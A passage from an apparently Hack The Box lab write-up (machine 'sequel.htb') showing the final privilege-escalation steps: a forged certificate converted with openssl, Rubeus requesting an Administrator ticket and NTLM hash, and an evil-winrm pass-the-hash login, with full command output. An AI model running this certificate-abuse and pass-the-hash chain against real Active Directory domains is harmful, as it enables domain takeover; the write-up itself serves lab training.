+RcY9Q96HImQqcvbwvhTrbNTZpBo4Bm5qR+q0Z4TlSkeW4hrDEmIJZTWvqKY8Qja1
+nQof5KAwRk7OM4TFNRfA5tfz0vJarEzMd8aM2QIDAQABAoIBADuxySROFAVQ7geW
+E+EkYVmzZPdUDlluzvarVNwckURD3+WNQaaVTy1mAbb6gOiqMpzrRWBh6wJphu4e
+dbS39KA+jnAool0FFkLNW+thR5eoN7dgLM53x7gZLb6eoRFo5GYmqwNrYitGoJ2G
+GF4FttZYYxrQmtA3Y4Krq/rfe0mX8HFAyeVc4u9k+liZhPvPK7Ez2xfcuHg+1EhE
+k4920ckdbjtLb61B0uzTHCCYlbdrvGXV2AuAI6u1W9LjQ2hIBtV+Jv8xf910wHv1
++ocNicMRGsAUVHyqAolMjYAfJZA/LPIY0dTW4ysOtK3TowdFmPgXd9D0UQXacIgp
+s82oUFUCgYEAw759b7qTmlUkuwf7fhZ6A6kvOyrd/uJEYuKyWlyTsLLcw6LwI/6Z
+Pi512QsQ8ehaMY3895nsWocGKXpM12eVOEMMjYwaXsi75yjm20juDUKLBhqtU1FP
+TN57NmvrZaLkXiUNg6zkIjSCqiYr64cJoYCjqibkuL9JCPd03YLDagsCgYEAx0Nz
+CO+sgIUZvnHfFtaq/9EDZ1NEhv78qVyiVZRaZfYjR8ZNFJVq2wt4vIa4I6zYMri2
+0sg74RWMTy19L2BU9TZ1hgN/t1DE5d67NVXdbb21QANLiPoVRxdi8+hxw3knHwQW
+s4/FZsMwcI4aM/hbRd2BcIulZ7NtHcvpaUP+VysCgYEAlyVHHHf4M4qdQyJFyrW2
+X49LHifapU64OZcM2wNzM1TZbOMrBNA6Ki6b5w1Jd1HQG0WlWNdtDvYGBw8duJKO
+QZRcZAwT7K6ZkUQfBqJI1spUKVF+FsDJN/TvNTWd3awrJJr91Xgx7EuZvaKd9U8f
+W6rGNcO0hweFcLwLbGPlWsMCgYEAnZEBcuyLHKmjXMwQm6+uUlGF/nuCsbkKNCZT
+G5cPEJdc+JGfPAqXD5T3qSRikZtI7nrP3seFSgxPAgE3f3IOXETvE8TKhjuxJxBE
+Ov2l9fRQUckJPsx6bNfaYILLCsZPoCAMj3q9nu/z6t0DbVsTWaC5jTRv3BuuyiQH
+czzX7zcCgYEAgIM8rXF3NUGJCKqxtZsHcoURi9MJ1avhhaHv12GY1gDQQY/f/KVC
+k3mL0+lKi16TUbvrBfgWpbpiAy6ov0ZpunkwHNdNqGGb198T/mputPz1krmobyLH
+4GcPn/ebIjIe26SuQJUb3m8qX/FU5yopo0TYaJ2Nu26DBbJgwoWoKsM<span class="o">=</span>
+<span class="nt">-----END</span> RSA PRIVATE KEY-----
+<span class="nt">-----BEGIN</span> CERTIFICATE-----
+MIIGEjCCBPqgAwIBAgITHgAAAAup5tHatr/2SAAAAAAACzANBgkqhkiG9w0BAQsF
+ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
+</code></pre></div></div>
+
+<p>We copy the private key and the certificate into a file and create the pfx format.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl pkcs12 <span class="nt">-in</span> cert.pem <span class="nt">-keyex</span> <span class="nt">-CSP</span> <span class="s2">"Microsoft Enhanced Cryptographic Provider v1.0"</span> <span class="nt">-export</span> <span class="nt">-out</span> cert.pfx
+</code></pre></div></div>
+
+<p>With the certificate we request a TGT as the user and also his NTLM hash.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments&gt; .<span class="se">\R</span>ubeus.exe asktgt /user:Administrator /certificate:cert.pfx /outfile:ticket /getcredentials /show /nowrap
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> Action: Ask TGT
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using PKINIT with etype rc4_hmac and subject: <span class="nv">CN</span><span class="o">=</span>Ryan.Cooper, <span class="nv">CN</span><span class="o">=</span>Users, <span class="nv">DC</span><span class="o">=</span>sequel, <span class="nv">DC</span><span class="o">=</span>htb
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Building AS-REQ <span class="o">(</span>w/ PKINIT preauth<span class="o">)</span> <span class="k">for</span>: <span class="s1">'sequel.htb\Administrator'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using domain controller: fe80::5c9:456f:bdd3:b5c8%4:88
+<span class="o">[</span>+] TGT request successful!
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="nb">base64</span><span class="o">(</span>ticket.kirbi<span class="o">)</span>:
+
+      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<span class="o">==</span>
+
+Exception: C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments<span class="se">\t</span>icket already exists! Data not written to file.
+
+  ServiceName              :  krbtgt/sequel.htb
+  ServiceRealm             :  SEQUEL.HTB
+  UserName                 :  Administrator <span class="o">(</span>NT_PRINCIPAL<span class="o">)</span>
+  UserRealm                :  SEQUEL.HTB
+  StartTime                :  9/29/2023 8:52:58 AM
+  EndTime                  :  9/29/2023 6:52:58 PM
+  RenewTill                :  10/6/2023 8:52:58 AM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable
+  KeyType                  :  rc4_hmac
+  Base64<span class="o">(</span>key<span class="o">)</span>              :  5joIvhVSWaeXC/Ij4lpczg<span class="o">==</span>
+  ASREP <span class="o">(</span>key<span class="o">)</span>              :  E16724EA2217AC9F480A5339D2F8070A
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting credentials using U2U
+
+  CredentialInfo         :
+    Version              : 0
+    EncryptionType       : rc4_hmac
+    CredentialData       :
+      CredentialCount    : 1
+       NTLM              : A
+</code></pre></div></div>
+
+<p>Finally, we can log to the machine with the NTLM hash.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>evil-winrm <span class="nt">-i</span> 10.10.11.202 <span class="nt">-u</span> Administrator  <span class="nt">-H</span> <span class="s1">'A52F78E4C751E5F5E17E1E9F3E58F4EE'</span>
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>sequel<span class="se">\a</span>dministrator
+</code></pre></div></div>
+
+      </section>
+    </div>
+  </body>
+</html>
